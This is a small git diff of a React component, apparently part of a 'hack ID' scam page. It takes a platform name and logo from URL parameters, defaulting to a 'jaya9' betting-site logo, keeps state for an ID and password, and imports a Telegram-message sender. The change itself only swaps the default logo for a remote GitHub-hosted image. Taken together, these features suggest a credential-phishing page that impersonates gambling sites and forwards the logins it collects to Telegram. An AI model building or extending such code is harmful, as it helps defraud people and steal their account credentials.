@@ -8,7 +8,7 @@ import { sendTelegramMessage } from "./actions"
 function HackIdPageComponent() {
   const searchParams = useSearchParams()
   const platformName = searchParams.get('platform') || 'Unknown Site'
-  const logoSrc = searchParams.get('logo') || '/jaya9-logo.png'
+  const logoSrc = searchParams.get('logo') || 'https://raw.githubusercontent.com/niloyyt499-cpu/aviatorlite-logo/refs/heads/main/jaya9-logo.png'
 
   const [hackId, setHackId] = useState("")
   const [hackPassword, setHackPassword] = useState("")
